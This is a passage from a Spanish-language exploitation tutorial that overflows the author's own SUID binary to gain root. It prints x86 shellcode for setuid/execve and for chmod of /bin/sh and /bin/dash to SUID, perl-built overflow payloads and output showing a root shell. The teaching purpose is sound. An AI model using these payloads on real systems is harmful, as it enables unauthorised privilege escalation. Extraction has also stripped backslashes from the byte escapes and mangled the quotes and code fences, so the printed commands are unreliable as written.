AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) = 1024  
write(1, "AAAAAAAAAAAA20313377377n", 17AAAAAAAAAAAA ���  
) = 17  
setuid32(0) = -1 EPERM (Operación no permitida)  
execveat(0, "/bin//sh", ["/bin//sh"], NULL, 0) = 0```

Puede verse cómo la llamada a setuid32() falla, esto se debe a que el proceso no tiene permisos para cambiar el ruid a 0, ya que su euid no es 0, una buena pregunta es por qué su euid no es 0 si es un binario SUID. Pues porque está ejecutado por strace, quien para poder acoplarse a él y debuggearlo necesita que se ejecute con los mismos privilegios que él (no puedes acoplarte un proceso de otro usuario a no ser que seas root, y no estamos ejecutando strace como root).

\[Por cierto, si por algún casual se hace un `cd`, cambiará el valor de la variable `PWD`, y si se vuelve a hacer un `cd`, cambiará también la variable `OLDPWD`. Es necesario tener mucho cuidado con esto, más de una vez te puede dar un buen quebradero de cabeza cuando bastaba con cambiar de terminal o modificar esas variables, lo digo porque justo me acaba de dar un pequeño problemita jajaja\].

Una forma de poder ejecutar nuestro shellcode del post anterior es introducirlo en una variable de entorno. Podemos calcular mediante [este programita](https://gist.github.com/superkojiman/6a6e44db390d6dfc329a) la dirección de dicha variable.  

    # Sol 3
    $ cat sc.asm
    BITS 32
    xor    eax, eax
    mov    al, 213  ; setuid32
    xor    ebx, ebx
    int    0x80

xor eax, eax  
push eax  
push 0x68732f2f  
push 0x6e69622f  
mov ebx, esp  
push eax  
push ebx  
mov ecx, esp  
mov al, 0xb  
xor edx, edx  
int 0x80

$ nasm sc.asm -o sc.o

$ lol sc.o  
\-rw-r–r– 1 arget arget 33 jul 5 11:51 sc.o

$ export sc=\`cat sc.o\`

$ echo $sc | xxd  
00000000: 31c0 b0d5 31db cd80 31c0 5068 2f2f 7368 1…1…1.Ph//sh  
00000010: 682f 6269 6e89 e350 5389 e1b0 0b31 d2cd h/bin..PS….1..  
00000020: 800a

$ gcc getenv.c -o getenv -m32

$ /home/arget/getenv sc /home/arget/a  
sc will be at 0xffffdc5d

Luego debemos saltar a 0xffffdc5d. Un buen lector habrá apreciado que el programita [getenv](https://gist.github.com/superkojiman/6a6e44db390d6dfc329a) no contempla los argumentos para calcular la dirección de la variable, esto se debe a que en el stack los argumentos se encuentran justo debajo de las variables del entorno, por lo que no las afectan.  
``# Sol 3  
$ /home/arget/a `perl -e 'print "A"x1036 . "x5dxdcxffxff"'`  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]���  
sh-4.4# whoami  
sh-4.4#``

Y ya la cuarta y última solución. Podemos simplemente cambiar los permisos de /bin/sh para que se convierta en un binario SUID. Necesitamos ejecutar para ello un chmod(«/bin/sh», 04775) (en C, un número precedido por un 0 indica que eśtá en octal, o sea que en realidad debemos introducir el número 2541 ó 0x9ed). Nada más fácil

    $ cat a.asm
    BITS 32
    xor    eax, eax
    xor    ecx, ecx
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx, esp
    mov    cx, 0x9ed
    mov    al, 15        ; __NR_chmod
    int    0x80

Muy bien, ensamblamos y estamos.

    $ nasm a.asm -o a.o

$ lol a.o  
\-rw-r–r– 1 arget arget 25 jul 5 12:50 a.o

$ /home/arget/a \`cat a.o«perl -e ‘print «A»x(1036-25) . «x10xcbxffxff»‘\`  
1�1�Ph//shh/bin��f��

What?? No nos alarmemos, el shellcode no tiene bytes nulos, ni debería ser nada grave. Mediante un ltrace comprobamos que puts() imprime solo 21 bytes, así que el problema se encontrará precisamente ahí. Mirando el shellcode encontramos un byte 0x09 que se corresponde con la tabulación, seguramente lo que ocurre es que también sirve para separar argumentos (al igual que el espacio). Tiene muy sencilla solución, el payload lo colocaremos entrecomillado.

```$ /home/arget/a "`cat a.o``perl -e 'print "A"x(1036-25) . "x10xcbxffxff"'`"  
1�1�Ph//shh/bin��f�� �̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���  
Violación de segmento```  
Vale, sé que parece que no ha pasado nada, pero en realidad ha pasado TODO.

    $ lol /bin/bash
    -rwsr-xr-x 1 root root 866600 jun  4 10:54 /bin/bash

(Se cambian los permisos de /bin/bash porque /bin/sh es un enlace simbólico al mismo)  
Sin embargo, es cierto, que al intentar ejecutarlo, por alguna cuestión interna de bash, no logramos el root. En cualquier caso hemos demostrado poder cambiar los permisos a un archivo perteneciente a root. Podríamos cambiar también los permisos de escritura de /etc/shadow. Otro posible objetivo es el intérprete dash, este, al contrario que bash, sí permite acceder a root cuando tiene el bit suid activado.

    # Sol 4
    $ lol /bin/dash
    -rwxr-xr-x 1 root root 110000 oct 23  2016 /bin/dash

$ dash  
$ whoami  
arget  
$ exit

$ cat a.asm  
BITS 32  
xor eax, eax  
xor ecx, ecx  
mov al, ‘h’  
push eax ; «hx00x00x00»  
push 0x7361642f ; «/das»  
push 0x6e69622f ; «/bin»  
mov ebx, esp  
mov cx, 0x9ed  
mov al, 15 ; \_\_NR\_chmod  
int 0x80

$ nasm a.asm -o a.o

$ lol a.o  
\-rw-r–r– 1 arget arget 27 jul 5 13:09 a.o

$ /home/arget/a «\`cat a.o«perl -e ‘print «A»x(1036-27) . «x10xcbxffxff»‘\`»  
1�1ɰhPh/dash/bin��f�� �̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ���  
Violación de segmento

$ lol /bin/dash
-rwsr-xr-x 1 root root 110000 oct 23  2016 /bin/dash

$ dash  
\# whoami  
root  
#

Ahí está. Lo que pasa es que dash no es estándar, no siempre se encuentra en el sistema.  
Por último no estaría de más añadir al final del shellcode un exit(0) para evitar que rompa el programa tras el chmod(), pero eso se lo dejo al lector.  
Por último, no olvidar volver a activar ASLR y quitar el bit SUID a los archivos /bin/bash y /bin/dash. Tampoco querrás mantener el programa que hemos estado explotando como SUID, ya que si alguien penetra en su sistema, puede emplearlo precisamente del mismo modo que nosotros lo hemos empleado.